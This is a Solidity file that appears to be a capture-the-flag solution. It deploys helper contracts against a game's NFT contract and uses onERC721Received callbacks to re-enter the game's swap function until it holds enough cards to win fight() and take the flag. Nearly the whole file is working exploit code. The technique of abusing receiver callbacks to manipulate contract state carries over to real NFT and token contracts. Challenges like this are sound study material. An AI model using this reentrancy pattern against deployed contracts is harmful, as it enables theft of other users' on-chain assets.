// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

interface IGame {
    function join() external returns (uint[3] memory deck);
    function fight() external;
    function flagHolder() external returns (address);
    function balanceOf(address who) external returns (uint);
    function swap(address to, uint gotId, uint wantId) external;
    function putUpForSale(uint id) external;
}

contract Solution {
    IGame private immutable game;
    uint[3] private deck;

    User u1;
    User u2;

    constructor(address game_) {
        game = IGame(game_);

        // Join game, receive 3 NFTs.
        deck = game.join();
        require(
            game.balanceOf(address(this)) == 3,
            "Solution: Joinig game failed"
        );
    }

    function captureFlag() external {
        // Put own NFT's for sale.
        game.putUpForSale(deck[0]);
        game.putUpForSale(deck[1]);
        game.putUpForSale(deck[2]);

        // Deploy 2 User's.
        u1 = new User(address(game));
        u2 = new User(address(game));

        // Let user's join game.
        u1.joinGame();
        u2.joinGame();

        // Let user's NFTs put up for sale.
        u1.putUpForSale();
        u2.putUpForSale();

        // Start attack.
        u1.attack(0, 8);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        uint balance = game.balanceOf(address(this));

        if (balance == 4) {
            // Continue with attack.
            u1.attack(1, 6);
        } else if (balance == 5) {
            // Continue with attack.
            u1.attack(2, 7);
        } else if (balance == 6) {
            // Continue with attack.
            u2.attack(0, 9);
        } else {
            // Capture Flag.
            game.fight();
            require(game.flagHolder() == address(this));
        }

        return IERC721Receiver.onERC721Received.selector;
    }


}

contract User {
    address private immutable solution;
    IGame private immutable game;
    uint[3] private deck;

    constructor(address game_) {
        solution = msg.sender;
        game = IGame(game_);
    }

    function joinGame() external {
        deck = game.join();
        require(
            game.balanceOf(address(this)) == 3,
            "Solution: Joinig game failed"
        );
    }

    function putUpForSale() external {
        game.putUpForSale(deck[0]);
        game.putUpForSale(deck[1]);
        game.putUpForSale(deck[2]);
    }

    function attack(uint idx, uint wantId) external {
        game.swap(solution, deck[idx], wantId);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
